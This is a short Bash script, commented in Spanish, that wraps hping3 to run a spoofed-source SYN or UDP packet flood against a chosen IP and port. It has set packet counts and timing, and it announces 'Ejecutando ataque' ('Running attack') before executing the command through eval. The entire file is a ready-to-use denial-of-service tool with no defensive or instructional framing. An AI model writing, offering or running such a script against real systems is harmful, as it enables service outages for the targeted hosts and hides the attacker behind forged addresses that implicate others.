#!/bin/bash

# Uso: ./script.sh -ip IP_OBJETIVO -p PUERTO -c PAQUETES -t TIEMPO --udp --spoof IP_ORIGEN

# Parsear argumentos
while [[ $# -gt 0 ]]; do
  case $1 in
    -ip)
      TARGET_IP="$2"
      shift 2
      ;;
    -p)
      TARGET_PORT="$2"
      shift 2
      ;;
    -c)
      PACKETS="$2"
      shift 2
      ;;
    -t)
      TIME="$2"
      shift 2
      ;;
    --udp)
      UDP=true
      shift
      ;;
    --spoof)
      SPOOF_IP="$2"
      shift 2
      ;;
    *)
      echo "Parámetro desconocido: $1"
      exit 1
      ;;
  esac
done

# Validar parámetros mínimos
if [[ -z "$TARGET_IP" || -z "$TARGET_PORT" || -z "$PACKETS" || -z "$SPOOF_IP" ]]; then
  echo "Uso: $0 -ip IP_OBJETIVO -p PUERTO -c PAQUETES -t TIEMPO --udp --spoof IP_ORIGEN"
  exit 1
fi

echo "Ejecutando ataque:"
echo "IP destino: $TARGET_IP"
echo "Puerto destino: $TARGET_PORT"
echo "Paquetes: $PACKETS"
echo "Tiempo (segundos): ${TIME:-No definido}"
echo "Modo UDP: ${UDP:-No}"
echo "IP spoofeada: $SPOOF_IP"

# Construir comando hping3
CMD="sudo hping3 --spoof $SPOOF_IP -p $TARGET_PORT -c $PACKETS $TARGET_IP"
if [[ $UDP == true ]]; then
  CMD="$CMD --udp"
else
  CMD="$CMD -S"
fi

if [[ -n "$TIME" ]]; then
  CMD="$CMD -i u$((1000000*$TIME/$PACKETS))"
fi

echo "Comando: $CMD"
eval $CMD
